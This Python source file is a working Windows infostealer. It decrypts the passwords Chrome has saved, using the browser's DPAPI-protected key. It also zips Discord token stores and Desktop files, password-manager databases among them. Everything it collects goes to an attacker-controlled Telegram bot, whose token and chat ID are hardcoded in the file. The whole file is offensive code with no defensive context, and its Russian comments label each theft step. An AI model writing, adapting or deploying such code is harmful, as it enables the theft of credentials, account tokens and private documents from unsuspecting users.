import os
import shutil
import sqlite3
import json
import base64
import requests
import zipfile
import tempfile
import win32crypt
from Crypto.Cipher import AES
import time

TOKEN = "7937322538:AAGcpTMZ0v2_2bcN2txtkTlRyI-IRcj0kQI"
CHAT_ID = "8951614421"

def send_telegram(text, file_path=None):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=10)
        if file_path and os.path.exists(file_path):
            url_doc = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
            with open(file_path, "rb") as f:
                requests.post(url_doc, data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
    except:
        pass

def get_chrome_key():
    try:
        local_state = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state, "r", encoding="utf-8") as f:
            state = json.load(f)
        key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        return decrypted[:-16].decode()
    except:
        return "Encrypted"

def steal_chrome():
    key = get_chrome_key()
    login_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    
    if not os.path.exists(login_db) or not key:
        return "Chrome DB not found or no key"

    temp_db = os.path.join(tempfile.gettempdir(), "temp_login.db")
    shutil.copy2(login_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    results = []
    for row in cursor.fetchall():
        url, user, encrypted_pass = row
        if user:
            decrypted = decrypt_password(encrypted_pass, key)
            results.append(f"URL: {url}\nLOGIN: {user}\nPASS: {decrypted}\n{'-'*30}")
            
    cursor.close()
    conn.close()
    os.remove(temp_db)
    return "\n".join(results) if results else "No passwords found"

def steal_discord():
    discord_path = os.path.join(os.environ["APPDATA"], "discord", "Local Storage", "leveldb")
    if os.path.exists(discord_path):
        temp_zip = os.path.join(tempfile.gettempdir(), "discord_tokens.zip")
        with zipfile.ZipFile(temp_zip, 'w') as zipf:
            for root, dirs, files in os.walk(discord_path):
                for file in files:
                    if file.endswith(('.ldb', '.log')):
                        zipf.write(os.path.join(root, file), file)
        return temp_zip
    return None

def steal_files():
    desktop = os.path.join(os.environ["USERPROFILE"], "Desktop")
    temp_zip = os.path.join(tempfile.gettempdir(), "desktop_files.zip")
    try:
        with zipfile.ZipFile(temp_zip, 'w') as zipf:
            for root, dirs, files in os.walk(desktop):
                for file in files:
                    if file.endswith(('.txt', '.pdf', '.doc', '.docx', '.png', '.jpg', '.kdbx')):
                        zipf.write(os.path.join(root, file), file)
        return temp_zip
    except:
        return None

if __name__ == "__main__":
    # 1. Пароли Chrome (в открытом виде)
    passes = steal_chrome()
    send_telegram(f"=== CHROME PASSWORDS (DECRYPTED) ===\n{passes}")

    # 2. Файлы с рабочего стола
    zip_path = steal_files()
    if zip_path:
        send_telegram("=== DESKTOP FILES ===", zip_path)

    # 3. Токены Discord
    discord_zip = steal_discord()
    if discord_zip:
        send_telegram("=== DISCORD TOKENS ===", discord_zip)
